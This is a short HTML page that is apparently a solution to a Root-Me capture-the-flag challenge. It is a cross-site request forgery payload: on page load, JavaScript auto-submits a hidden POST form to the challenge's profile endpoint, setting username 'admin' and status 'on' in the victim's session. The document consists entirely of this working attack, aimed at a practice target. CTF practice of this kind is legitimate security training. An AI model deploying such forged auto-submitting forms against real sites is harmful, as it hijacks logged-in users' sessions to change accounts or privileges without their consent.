<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Auto Submit Form</title>
    <script>
        // This will trigger the form submission when the page loads
        window.onload = function() {
            document.getElementById("autoSubmitForm").submit();
        };
    </script>
</head>
<body>
    <form id="autoSubmitForm" action="http://challenge01.root-me.org/web-client/ch22/?action=profile" method="POST" enctype="multipart/form-data">
        <input type="hidden" name="username" value="admin">
        <input type="hidden" name="status" value="on">
    </form>
</body>
</html>
